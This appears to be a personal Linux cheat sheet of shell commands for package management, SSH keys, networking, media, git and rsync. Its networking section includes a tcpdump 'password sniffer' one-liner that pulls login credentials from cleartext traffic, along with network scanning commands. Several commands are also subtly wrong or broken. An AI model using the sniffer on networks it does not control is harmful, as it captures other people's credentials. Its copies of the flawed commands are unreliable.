$> function mcdefault() { if [ ! -f /usr/share/mc/skins/default-blue.ini ]; then sudo cp /usr/share/mc/skins/default.ini /usr/share/mc/skins/default-blue.ini  && sudo rm /usr/share/mc/skins/default.ini ; sudo cp /usr/share/mc/skins/$1.ini /usr/share/mc/skins/default.ini ; else  sudo rm /usr/share/mc/skins/default.ini ; sudo cp /usr/share/mc/skins/$1.ini /usr/share/mc/skins/default.ini ; echo "The default midnight commander skin is now $1".; fi ; }
##------------------------------------------
## OR
## Make own skin and put in ~/.local/share/mc/skins
##------------------------------------------
## Make gotar the default globally
#function mcgotar() { sudo mv /usr/share/mc/skins/default.ini /usr/share/mc/skins/default-blue.ini ; sudo cp /usr/share/mc/skins/gotar.ini /usr/share/mc/skins/default.ini ; echo "The default midnight commander skin is now gotar. To reverse this change run mcblue default-blue." ; }
##------------------------------------------
## Change the default mc skin to whatever you want
#function mcdefault() { if [ ! -f /usr/share/mc/skins/default-blue.ini ]; then echo "Run mcgotar first." && exit 0; else  sudo rm /usr/share/mc/skins/default.ini ; sudo cp /usr/share/mc/skins/$1.ini /usr/share/mc/skins/default.ini ; echo "The default midnight commander skin is now $1"; fi ; }
##------------------------------------------
## OR, not as good,  rewrite configs
## or with long color picks
$> mc --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default
## or yellow
$> mc --colors normal=yellow,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default
## or blue
$> mc --colors normal=lightgray,blue:normal=blue,default:selected=white,brightblue:marked=yellow,default:markselect=yellow,gray:directory=brightblue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default
## or dark
$> mc --colors normal=black,white:selected=white,black:marked=blue,white:markselect=black,white:errors=red,white:input=black,white:reverse=white,black:gauge=black,white:directory=black,white:executable=gray,white:stalledlink=lightgray,white:special=gray,white:core=red,white:
## or by changing ~/.config/mc/ini
## Make the colors permanent
$> sed -i 's/base_color=/base_color=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default' ~/.config/mc/ini
## Another
$> sed -i 's/base_color=/base_color=lightgray,blue:normal=blue,default:selected=white,brightblue:marked=yellow,default:markselect=yellow,gray:directory=brightblue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default/' ~/.config/mc/ini
## Undo the above change
$> sed -i 's/base_color=lightgray,blue:normal=blue,default:selected=white,brightblue:marked=yellow,default:markselect=yellow,gray:directory=brightblue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default/base_color=/' ~/.config/mc/ini
## Or in mcedit hold shift to highlight to copy, middle click to paste
$> sudo mcedit ~/.config/mc/ini
## Change [Colors] section to this;
#$ [Colors]
#$ base_color=lightgray,blue:normal=blue,default:selected=white,brightblue:marked=yellow,default:markselect=yellow,gray:directory=brightblue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default
##------------------------------------------
## Get 256 colors and use 256 color skins
$> export TERM=xterm-256color # BREAKS mc in non gui tty logins
$> mc -S sand256
##==========================================
## shell. Put a console clock in top right corner
$> while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
##==========================================
## hardware. os. Turn off LCD
$> xset dpms force standby
$> xset dpms force off
##==========================================
## os. permissions. Add a user
$> sudo adduser USER_NANE
## Delete a user
$> sudo deluser USER_NAME
## Change user password
$> sudo passwd USER_NAME
## Changes user fullname, office number, office extension, and home phone number information.
$> sudo chfn USER_NAME
## Display user information
$> finger USER_NAME
## Temporarily prevent a user from logging in
$> sudo usermod -L USER_NAME
## Revoke the operation above
$> sudo usermod -U USER_NAME
## Add a user to admin group
$> sudo usermod -G admin -a USER_NAME
##==========================================
## packagemanager. os. app. Set apt source
$> sudo software-properties-gtk
$> sudo software-properties-kde
## Display the packages which are not installed but have remained residual config
$> dpkg -l | awk '/^rc/ {print $2}'
## Add a PPA repository:
$> sudo add-apt-repository ppa:PPA-REPOSITORY-NAME
## Display a list of files. The files are installed from a given package.
$> dpkg -L PACKAGE_NAME
## Display a list of packages. The packages installed a given file.
$> dpkg -S FILE_NAME
## Display a list of packages. The name of packages matches given regex pattern.
$> apt-cache search REG_EXPRESSION
## Display a list of packages. The packages provide a given file.
$> apt-file search FILE_NAME
## Display a list of packages. The given package depends on the list of packages.
$> apt-cache depends PACKAGE_NAME
## Display a list of packages. These packages depend on the given package.
$> apt-cache rdepends PACKAGE_NAME
## Prompt for a disk to be inserted and then add the disc to the source list.
$> sudo apt-cdrom add
## Install the newest versions of all packages currently installed on the system.
$> sudo apt-get upgrade
## Delete residual package configuration files.
$> dpkg -l | grep ^rc | awk '{print $2}' | sudo xargs dpkg -P
## Automatically install necessary files for './configure ; make ; make install'
$> sudo auto-apt run ./configure
## Save the list of packages currently installed on your system.
$> dpkg --get-selections | grep -v deinstall > SOME_FILE
## Then use the file to restore packages.
$> dpkg --set-selections < SOME_FILE ; sudo dselect
## After running "sudo apt-get install", "*.deb" files are stored in
$> cat /var/cache/apt/archives
## You can clean this directory by:
$> sudo apt-get clean
## Display URL for a given package
$> sudo apt-get -qq --print-uris install PACKAGE_NAME
## Display some statistics about the apt cache
$> apt-cache stats
## Display all package name
$> apt-cache pkgnames
## Display some information of a given package
$> apt-cache show PACKAGE_NAME
$> apt-cache showpkg  PACKAGE_NAME
##==========================================
## ########################
## ##    ssh
## ########################
## networking. shell. ssh secure shell
##------------------------------------------
### ssh secure shell remote
## Install ssh server and client
$> sudo apt-get install openssh-server openssh-sftp-server openssh-client sshfs
## Login to server, the server will ask for a password
$> ssh $USER@server
## Use -t to call a shell and cd to a particular directory
$> ssh -t example.com "cd /foo/bar; exec \$SHELL -l"
## Setup server
## If you have a complelling reason chamge port from port 22 to something else.
## Check current port
$> cat /etc/ssh/sshd_config | grep -i Port
## Change port to 26
$> sudo sed -i "s/Port 22/Port 26/"
## Login to server at port 26
$> ssh user@192.168.1.1 -p 26
##------------------------------------------
## Use openssl aes rsa encryption keys to connect securely to server
## Create keys. RSA is old, use ed25519. Public keys to put on remote machines which will use that key to authenticate, and a private key you set strong permissions on, that you use to give you access to the remote.
$> ssh-keygen -t rsa
##   Generating public/private rsa key pair.
##   Enter file in which to save the key (/Your/HomeDir/.ssh/id_rsa):
##   Enter passphrase (empty for no passphrase):
## defaults to 2048 bits, can change to higher bits with -b 4096, and -C and put in a comment
$> ssh-keygen -t rsa -b 4096 -C 'Passwd_hint'
## Available encryption; “dsa”, “ecdsa”, “ed25519”, “rsa”. Change the key names appropriately.
$> ssh-keygen -t ed25519 -C 'Passwd_hint'
## This will place the private key in ~/.ssh/id_rsa and the public key in ~/.ssh/id_rsa.pub.
## Set permissions
$> chmod 700 ~/.ssh
$> chmod 600 ~/.ssh/id_rsa; chmod 600 ~/.ssh/id_rsa.pub
## Do this for each for a unique name
$> mv ~/.ssh/id_rsa  ~/.ssh/servername_id_rsa; mv ~/.ssh/id_rsa.pub  ~/.ssh/servername_id_rsa.pub;
##------------------------------------------
### Setup on server !!!! Do not copy your private key over. !!!!
## Transfer pub key to server:
$> scp ~/.ssh/id_rsa.pub user@myserver.com:~/id_rsa.pub
## in the server, add pub key to authorized_keys file
$> cat id_rsa.pub >> ~/.ssh/authorized_keys
## Or
## append the contents of ~/.ssh/id_dsa.pub to the end of ~/.ssh/authorized_keys on the remote machine.
$> cat .ssh/serername_id_rsa.pub | ssh $USER@192.168.1.101 'cat >> ~/.ssh/authorized_keys'
## Or
## Can use ssh-copy-id instead; the cat port technique above is more portable.
$> ssh-copy-id -i ~/.ssh/id_rsa.pub remote-host
## !!!! Do not copy your private key over. !!!!
##------------------------------------------
## sshd Disable Password Authentication
## http://stackoverflow.com/questions/20898384/ddg#20898942
## Edit /etc/ssh/sshd_config
$> cat /etc/ssh/sshd_config | grep -B 2 PasswordAuthentication
## Change to no to disable tunnelled clear text passwords
## #PasswordAuthentication no
## Uncomment the second line, and, if needed, change yes to no.
$> sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
$> service ssh restart
## Undo and allow password logins
$> sed -i 's/PasswordAuthentication no/#PasswordAuthentication no/' /etc/ssh/sshd_config
##------------------------------------------
## Log in to remote server
## With explicit call of the key file
$> ssh -i .ssh/servername_id_rsa $USER@server
##------------------------------------------
## Log in to remote server without explicit call of the key file by adding it to IdentitiyFile setting in ~/.ssh/config
$> echo '
  Host servername
  User $USER
  Hostname 192.168.1.101
  Port 22
  PreferredAuthentications publickey
  IdentityFile "/home/$USER/.ssh/keyfile"
  #BatchMode yes
  #EscapeChar none
  ' >> ~/.ssh/config
## Or use printf to add multiline info to ~/.ssh/config
$> printf '\nHost servername\nUser $USER\nHostname 192.168.1.101\nPort 22\nPreferredAuthentications publickey\nIdentityFile "/home/$USER/.ssh/id_rsa"\n#BatchMode yes\n#EscapeChar none\n' >>  ~/.ssh/config
## Or use editor to add above info
$> mcedit ~/.ssh/config
##------------------------------------------
## Log in to remote server
## Without explicit call of the key file by using the .ssh/config entry
$> ssh servername
##------------------------------------------
## Run command on remote server
$> cat file | ssh -e none remote-host 'cat > file'
##------------------------------------------
## Change the password attached to a generated key file
$> ssh-keygen -p -P old_passphrase -N new_passphrase -f keyfile
##------------------------------------------
## Extract public key from private
## This will extract the public key that is stored in the private key using openssl
$> openssl rsa -in key.priv -pubout > key.pub
##------------------------------------------
## Remove key from known_hosts
$> ssh-keygen -R "hostname"
## Or
$> ssh-keygen -f "/home/eakinc/.ssh/known_hosts" -R 192.168.1.90
##------------------------------------------
## sftp interactive shell
$> sftp $USER@203.0.113.1
## To download a file:
$> get /path/server/file /path/local
## To download a directory
$> get -r /path/server/folder /path/local
## Put a file on remote server
$> put /path/local/content /path/remote/location
## Put a directory on remote server
$> put -r /path/local/ /path/remote/location
##==========================================
## Install ssh server
$> sudo apt-get install openssh-server openssh-sftp-server openssh-client sshfs
##-----------------------------------------
## https://www.digitalocean.com/community/tutorials/how-to-use-sshfs-to-mount-remote-file-systems-over-ssh
## Mount ssh with pem file
$> sudo apt install sshfs
$> sshfs -o IdentityFile="~/.ssh/commandlinefun.pem" $USER@13.57.229.253:/var/www /home/$USER/mnt
$> man sshfs # some options, -o port=PORT,follow_symlinks,compression=yes,allow_other,IdentityFile="~/.ssh/key.pem"
## Exp
$> sshfs -o compression=yes,allow_other,IdentityFile="~/.ssh/key.pem" $USER@xxx.xxx.xxx.xxx:/remote/path/ /local/mnt
##
$> sudo nano /etc/fstab
@> root@xxx.xxx.xxx.xxx:/ /local/mnt
@> USER@xxx.xxx.xxx.xxx:/remote/path/ /local/mnt fuse auto,user,_netdev,reconnect,uid=1000,gid=1000,IdentityFile="/home/$USER/.ssh/key.pem",idmap=user,allow_other  0
@> USERNAME@HOSTNAME_OR_IP:/REMOTE/DIRECTORY  /LOCAL/MOUNTPOINT  fuse.sshfs _netdev,user,idmap=user,transform_symlinks,identityfile=/home/USERNAME/.ssh/id_rsa,allow_other,default_permissions,uid=USER_ID_N,gid=USER_GID_N 0 0
##==========================================
## Old Comment.
## ssh Agent.
## Check keys.
ssh-add -l
## Change the comment of a key.
ssh-keygen -c -f ~/.ssh/id_ed25519 -C "YOUREMAIL@email.com"
## Change the passphrase for an existing private key without regenerating the keypair.
ssh-keygen -p -f ~/.ssh/id_ed25519
## Remove keys from agent.
ssh-add -D
## Add back in.
ssh-add ~/.ssh/id_ed25519
## Check if using HTTPS. If yes you can change to ssh.
git remote -v
## To change from a HTTPS URL to a SSH URL.
git remote set-url origin git@github.com:YOURGITHUBACCOUNT/YOURREPO.git
## #########################
## ##    END ssh
## #########################
##==========================================

##==========================================
## ##########################################################
## ##    END Setup
## ##########################################################
##==========================================
##
##
##
##==========================================
## ####################################################
## ##    Networking
## ####################################################
##==========================================
## Find out what networking devices you have
$> ifconfig -a
$> lshw -C network
## Turn on and off networking device
$> sudo ifconfig <interface> down
$> sudo dhclient -r <interface>
$> sudo ifconfig <interface> up
## Scan wifi Example;<interface>=wlan1
$> iwlist wlan1 scan
$> iwlist wlan1 scan | grep -E 'ESSID|Cell'
## Connect to a wifi network
$> sudo iwconfig <interface> essid "<ESSID_IN_QUOTES>"
$> sudo iwconfig <interface> key '<wifipassword>'
$> sudo iwconfig <interface> mode Managed
$> sudo iwconfig <interface> channel <same channel number as router>
$> sudo dhclient <interface>
$> sudo iwconfig wlan1 essid 'My Network' AP '00:00:FF:DD:43:78' channel 7 key s:'Mykey'
## Display your local IP address
$> ip addr | grep 'inet '
## Display only your local IP address
$> ifconfig wlan1 | grep "inet addr" | awk -F: '{print $2}' | awk '{print $1}'
## Display your outside IP address
$> nslookup myip.opendns.com resolver1.opendns.com
## Display your gateway IP address
$> ip route show | grep -i 'default via'| awk '{print $3 }'
## Scan for other hosts on network
$> sudo arp-scan --interface=<interface> --localnet
## Find open ports
$> sudo nmap -sT -O <host>
## Display NetBIOS name of a given IP address
$> nmblookup -A IP_ADDRESS
## Scan Subnet for IP and MAC addresses
$> nmap -sP 192.168.1.0/24
## Display hostname
$> hostname
##==========================================
## Get wifi working
$> sudo iw dev
$> sudo ip link show wlan0
$> sudo ip link set wlan0 up
$> sudo ip link show wlan0
$> sudo iw wlan0 link
$> sudo dhclient -r
$> sudo service networking restart
$> sudo iw wlan0 link
$> sudo iw wlan0 scan
$> sudo iw wlan0 scan | grep SSID
$> sudo route show
$> sudo ip route show
##==========================================
## Saved connections.
$> nmcli connection show
$> nmcli --show-secrets connection show "Auto TARDIS"
## Show a prettified list of nearby wireless APs
$> nmcli device wifi list
## Get the current wifi password of a Connected Device with NMCLI
## Comes with a QR code, so make sure your trust the source, if running from a device other than your own.
$> nmcli device wifi show-password
##==========================================
## Network monitor with a graph
$> slurm -i <interface (wlan1, eth0 etc)>
##==========================================
## Ping
$> ping -c 3 192.168.1.1     ## Ping router
$> ping -c 3 8.8.8.8         ## Ping DNS
$> ping -c 3 yahoo.com       ## Ping with URL
##==========================================
## Get your external IP address
$> echo $(wget http://ipecho.net/plain -q -O -)
## or
## Get your public IP address from the web
$> curl ifconfig.me
## Display your outside IP address
$> nslookup myip.opendns.com resolver1.opendns.com
## Display your outside IP address information
$> curl ifconfig.co/all.json: </dev/tcp/127.0.0.1/80
##==========================================
## Secure shell to other computers
$> ssh user@host
## Key stored at
$> cat ~/.ssh/known_hosts
## To clear the key
$> ssh-keygen -R hostname
## To clear all keys
$> > ~/.ssh/known_hosts
##==========================================
## netstat is cool
$> netstat -i                       ## --interfaces, Display a table of all network interfaces.
$> netstat -l                       ## --listening, Show only listening sockets (These are omitted by default)
$> netstat -s                       ## --statistics, Display summary statistics for each protocol.
$> netstat -tunpl                   ## --tcp, --udp, --numeric IP, -p PID/Program name, --listening
$> netstat -np | grep -v ^unix      ## --numeric IP, -p PID and name of the program
##==========================================
## Determine if a port is open
$> : </dev/tcp/127.0.0.1/80
## For times when netcat isnt available. Will throw a Connection refused message if a port is closed.
## Scriptable: 'openport port#' exp. 'openport 80'
$> function openport() { (: </dev/tcp/127.0.0.1/$1) &>/dev/null && echo "OPEN" || echo "CLOSED" ; }
##==========================================
## Map the web. Where is the server you are looking at?
$> nmap yahoo.com
##==========================================
$> ssh -N -L2001:localhost:80 somemachine
## http://localhost:2001/
## start a tunnel from some machine's port 80 to your local port 2001
## now you can acces the website by going to
## http://localhost:2001/
##==========================================
## Running info on network and disks:
$> sudo apt-get install dstat
$> dstat
##==========================================
## set up network
## cat /ect
$> ifconfig eth0 up 192.168.whatever.yourIP netmask 255.255.255.whatever
$> route add gw 209.11.225
## or whatever your gateway is.
$> cat /ect/resolv.conf
## edit nameserver to set DNS
##==========================================
## Show Your Network Connections
## Show all connections with -i
$> lsof -i
##==========================================
## Password sniffer:
$> tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20
## Traffic piped through grep;
$> sudo tcpdump -n -A | grep -e '<String or IP>'
##==========================================
## Use 3 threads to download some big file;
$> axel -a -n 3 http://somelink-to-download/
##==========================================
## Share file through http 8088 port
$> nc -v -l 8088 < file.ext
$> function share8088 () { nc -v -l 8088 < $1 ; }
##==========================================
## Share current directory through http 8000
$> python -c "import SimpleHTTPServer;SimpleHTTPServer.test()"
$> python –m SimpleHTTPServer 8000
## In case you need to test some CGI scripts this does the job. It also has the functionality of a http server.
$> python2 -m CGIHTTPServer
## Test python3 web server
$> python3 -m http.server <PORT>
##==========================================
## mtr Trace Route
$> mtr www.google.com
##==========================================
## Mount Windows fileshare on a domain from bash
$> mount -t cifs -o username=SlackerMojo,domain=WORKGROUP,rw //192.168.1.24/f /mnt/storage
##==========================================
$> ss              ## List all TCP
$> dig             ## DNS lookup utility
##==========================================
## find all active IP addresses in a network
$> nmap -sP 192.168.0.*
##==========================================
## Linux / UNIX one liner to ping all hosts on the LAN
$> for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : ; done
$> alias lanip='for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : ; done'
##==========================================
## Chat with other users on the same netork;
$> sudo apt-get install ytalk
## Both parties run talk <user-you-want-to-talk-to>@<host-IP-or-name> #on both
$> talk user@host
##==========================================
## Disable Samba from listening on the samba ports:
$> sudo ufw deny Samba
## To disable the samba server from running:
$> sudo service smbd stop
$> sudo service nmbd stop
## To prevent Samba server from starting on boot:
$> sudo mv /etc/init/nmbd.conf /etc/init/nmbd.conf.stop
$> sudo mv /etc/init/smbd.conf /etc/init/smbd.conf.stop
## Undo
$> sudo mv /etc/init/nmbd.conf.stop /etc/init/nmbd.conf
$> sudo mv /etc/init/smbd.conf.stop /etc/init/smbd.conf
##---------------------------------------------
## ?Disable the Samba services. To do so, run these commands:
## Stop the service currently running
$> sudo stop nmbd
$> sudo stop smbd
## Change the configuration so that samba will not be started on reboot.
$> echo manual | sudo tee -a /etc/init/nmbd.override
$> echo manual | sudo tee -a /etc/init/smbd.override
##==========================================
## ####################################################
## ##    END Networking
## ####################################################
##
##
##
## #######################################################
## ##    System
## #######################################################
##==========================================
## Suspend computer
$> dbus-send --system --print-reply --dest=org.freedesktop.UPower /org/freedesktop/UPower org.freedesktop.UPower.Suspend
##==========================================
## Power off computer
$> sudo poweroff
##==========================================
## Reboot computer
$> sudo reboot
##==========================================
## Check battery
$> upower -i $(upower -e | grep 'BAT') | grep -E "state|to\ full|percentage"
##==========================================
## Turn off the laptop display
$> xset dpms force off
##==========================================
## Format for printing then send to printer
$> pr file.txt | lpr
##==========================================
##
## #############################################
## ##    Multimedia
## #############################################
##==========================================
## If you want to cut an AVI file to extract a portion.(require mencoder)
$> mencoder your_file.avi -ss 1:24:12 -endpos 29 -ovc copy -oac copy -noskip -skiplimit 1 -ofps 25 -mc 0 -o extract.avi
## This gives us an excerpt from a film starting 1H: 24m: 12s, duration is 29 seconds with the synchronization of sound and picture preserved.
##==========================================
## Not working. Changed site :(
## Play streaming music on command line. Awesome!!!!
## List available stations.
## Look for the list of stations here: http://pub7.di.fm Or here: https://goo.gl/pdhhpQ
$> w3m -dump http://pub7.di.fm/ | grep 'Mount Point' | grep 'aac ' | sed 's/Mount Point \///g' | sed 's/ Login//g'
$> mplayer http://pub7.di.fm/di_ambient_aac?1 -user-agent "AudioAddict-di/3.2.0.3240 Android/5.1"
## Play streaming media find media at  http://pub7.di.fm/ use as argument the string after Mount Point /
## Some favorite stations: di_bigbeat_aac, di_breaks_aac, di_classictrance_aac, di_jungle_aac,
$> function streamfm() { mplayer http://pub7.di.fm/$1?1 -user-agent "AudioAddict-di/3.2.0.3240 Android/5.1" ; }
## This commands does just two things: fakes user agent (the one was taken from recent Android app) and sends the (possibly) listener ID (it can be any - I put "1" here because it works like a charm - after the name of stream ?1 as you can see).
##==========================================
## Record desktop:
## Record the desktop to animated gif image with cursor showing for 20 seconds;
$> sudo apt-get install byzanz
$> byzanz-record --duration=20 --cursor desktoprecord.gif
## or
## Record the desktop to .mpg with cursor
$> ffmpeg -f x11grab -s 1440x900 -r 25 -i :0.0 -qscale -0 output.mpg
##==========================================
## Take audio notes with datestamp YYYYMMDD-HHMMSS
$> arecord -D plughw:0,0 -f cd -c 1 -t wav -d 0 -q -r 16000 | flac - -s -f --best --sample-rate 16000 -o audio$(date +"%Y%m%d-%H%M%S").flac
## ..which does a high quality, wave type recording and pipes it into the flac encoder, which outputs ./test.flac
## or just a wav file;
$> arecord -D plughw:0,0 -f cd -c 1 -t wav -d 0 -q -r 16000 audio$(date +"%Y%m%d-%H%M%S").wav
##==========================================
## Make a 10sec gif from a video starting at 45sec
$> ffmpeg -v warning -ss 45 -t 10 -i test.mp4 -vf scale=300:-1 -gifflags +transdiff -y test.gif
##==========================================
## Turn a .wav to .mp3
## with ffmpeg
$> ffmpeg -i test2.wav test2.mp3
## Create mp3 from wav
$> lame -V3 input.wav output.mp3
## Convert an mp3 and add to it a img
$> lame -v3 --ti /path/to/file.jpg audio.mp3 new-audio.mp3
##==========================================
## mp4 to mpeg for dvd creation
$> avconv -i FILE.mp4 -f dvd -c:v:0 mpeg2video -s 720x576 -r 25 -g 15 -b:v:0 8000000 -maxrate:v:0 8000000 -minrate:v:0 8000000 -bufsize:v:0 1835008 -packetsize 2048 -muxrate 10080000 -b:a 192000 -ar 48000 -c:a:0 ac3 -map 0:v -map 0:a FILE.mpeg
##==========================================
## ASCII webcam live stream video using mplayer
$> mplayer -tv driver=v4l2:gain=1:width=640:height=480:device=/dev/video0:fps=10:outfmt=rgb16 -vo aa tv://
##==========================================
##==========================================
##
##
## #############################################
## ##    Video
## #############################################
##==========================================
##==========================================
##
##
## #############################################
## ##    Web
## #############################################
##==========================================
## Download entire directory recursive -r, without climbing the directory tree -np, continue interupted download -c.
$> wget -r -c -np -e robots=off --random-wait --limit-rate=80k <URL>
##==========================================
## man wget ; recursive -r, from text file list -i, continue interupted download -c, Do not ascend to the parent directory -np or --no-parent, send to background -b.
##==========================================
##  ###########################################
##  ##    Text
##  ###########################################
##==========================================
## Create and start writing a file. Commit with cntl+d.
$> cat > test.txt
$> write what you want
$> cntl+d
##==========================================
## ####################################
## ##    git howto
## ####################################
## revisioning tool. Keeps all revisions of files
##-------------------------------------
## Set up your name and e-mail. Run the following commands to let git know your name and e-mail address. If git is already installed, skip down to the end of the line.
$> git config --global user.name "Your Name"
$> git config --global user.email "your_email@whatever.com"
## Installation Options line endings
$> git config --global core.autocrlf input
$> git config --global core.safecrlf true
## Create a repository
## Make a directory and add a file to keep revisioned exp. -/work/hello/hello.html
$> mkdir hello
$> cd hello
$> echo 'Hello world.' > hello.html
## Directory that contains one file. Run git init in order to create a git repo from that directory.
$> git init
### Add the page to the repository
## Add the “Hello, World” page to the repository.
$> git add hello.html
$> git commit -m "First Commit"
    #   [master (root-commit) 0e94c37] First Commit
    #    1 file changed, 1 insertion(+)
    #    create mode 100644 hello.html
## Check the status of the repository
## Use the git status command, to check the current state of the repository.
$> git status
## Change file
$> echo '<H1>Hello world.<H1>' > hello.html
$> git status
    # Git sees changes
## Stage changes
$> git add hello.html
$> git status
## use the git reset command to unstage these changes.
$> git reset hello.html
## keep track of log as you work
$> while :; do clr;  git --no-pager log -33 --graph --all --date=short --pretty=oneline --abbrev-commit --decorate $*;    sleep 1; done
## Git log
Useful specifiers for git log --pretty=format
## Specifier       Description of Output
$>  %H              ## Commit hash
$>  %h              ## Abbreviated commit hash
$>  %T              ## Tree hash
$>  %t              ## Abbreviated tree hash
$>  %P              ## Parent hashes
$>  %p              ## Abbreviated parent hashes
$>  %an             ## Author name
$>  %ae             ## Author email
$>  %ad             ## Author date (format respects the --date=option)
$>  %ar             ## Author date, relative
$>  %cn             ## Committer name
$>  %ce             ## Committer email
$>  %cd             ## Committer date
$>  %cr             ## Committer date, relative
$>  %s              ## Subject
## Example
git log --pretty=format:"%h %s" --graph
## Option              Description
$>  -p                  ## Show the patch introduced with each commit.
$>  --stat              ## Show statistics for files modified in each commit.
$>  --shortstat         ## Display only the changed/insertions/deletions line from the --stat command.
$>  --name-only         ## Show the list of files modified after the commit information.
$>  --name-status       ## Show the list of files affected with added/modified/deleted information as well.
$>  --abbrev-commit     ## Show only the first few characters of the SHA-1 checksum instead of all 40.
$>  --relative-date     ## Display the date in a relative format (for example, “2 weeks ago”) instead of using the full date format.
$>  --graph             ## Display an ASCII graph of the branch and merge history beside the log output.
$>  --pretty            ## Show commits in an alternate format. Option values include oneline, short, full, fuller, and format (where you specify your own format).
$>  --oneline           ## Shorthand for --pretty=oneline --abbrev-commit used together.
##==========================================
##  ###########################################
##  ##    Files
##  ###########################################
##==========================================
## Run every script in folder
$> run-parts --report /path/to/folderfullofcommands
##==========================================
## Copy -u only newer and updated files, -R recursively, -v verbose, -i interactive
$> cp -uRvi /path/to/source/copy /path/to/desination
##==========================================
### rsync
## Backup a dirctory -a archive mode preserves all, -v verbose
$> rsync -av /src/foo /dest
## or
$> rsync -av /src/foo /dest/foo/
##------------------------------------------
## Backup to remote server 192.168.0.101, -e ssh protocol, showing progress of transfer
$> rsync -avze ssh --human-readable --progress /local/files/ USER_NAME@192.168.0.101:/remote/files
##------------------------------------------
## Backup include files and directory only which starts with ‘R’ exclude all other files and directory
##-a archive, -v verbose -z compress, -e ssh protocol, -h --human-readable ,
$> rsync -avze --human-readable  --progress ssh --include 'R*' --exclude '*' /local/files/ USER_NAME@192.168.0.101:/remote/files
##------------------------------------------
## Backup only include files smaller than 2mb to remote directory
$> rsync -avzhe ssh --max-size='2000k' /local/files/ USER_NAME@192.168.0.100:/remote/files
##------------------------------------------
## With a progress meter -r, --recursive, -t --times preserve modification times, -x --one-file-system don't cross filesystem boundaries,
$> rsync -r -t -x -v --progress --numeric-ids -s /path/from/ /path/to
##------------------------------------------
## Fast --whole-file disables file checking to speed up sync
$> rsync -r -t -x -v --progress --numeric-ids -s --whole-file /path/from/ /path/to
## rsync -r -n -t -p -v --progress -s --whole-file
##==========================================
## Replace text in a line containing a pattern
$> sed '/PATTERN/ { s/ORIGINAL/REPLACEMENT/; }'
$>? sed '/PATTERN/ { s/ORIGINAL/REPLACEMENT/; }'
##==========================================
## Replace all instances of "A" with "B" in file "source" saved as file "destination"
$> xxd -p source | fold -w2 | paste -sd' ' | sed "s/A/B/g" | xxd -p -r > destination
##==========================================
##------------------------------------------
##= Spreadsheets =
##------------------------------------------
## sc is a command line spreadsheet
$> sc
##    Enter data into cells
#$ "<text"                              ## Enters left justified text.
#$ ">text"                              ## Enters right justified text.
#$ "=number"                            ## Enters a number
#$ "=formula"                           ## Enters a formula.
#$ "=H2"                                ## Make equal to another cell in this case H2
#$ "=@sum(C44:C47)"                     ## Enters sum
#$ "gB13                                ## go to cell B13.
#$ "E"                                  ## Edit string value
#$ "5ir"                                ## go to cell A5, insert five more rows before row 5 formulas will autofix
